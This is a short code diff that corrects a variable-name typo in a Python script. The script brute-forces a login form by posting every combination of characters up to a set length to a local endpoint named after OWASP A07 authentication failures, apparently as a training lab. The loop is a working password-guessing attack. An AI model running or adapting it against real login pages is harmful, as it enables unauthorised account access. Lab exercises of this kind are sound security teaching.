@@ -4,7 +4,7 @@ import requests
 import itertools
 
 username_length = 2
-password_legnth = 4
+password_length = 4
 
 username_characters = []
 for i in range(48, 58):
@@ -20,7 +20,7 @@ for i in range(48, 58):
 # print(password_characters)
 
 def crack_password(username):
-  for i in range(0, password_legnth):
+  for i in range(0, password_length):
     for password in itertools.product(password_characters, repeat=i+1):
         temp = requests.post("http://localhost/A07-authenticationFailure/login.php", data={"username": username, "password": ''.join(password)})
         if "Incorrect password" not in temp.text:
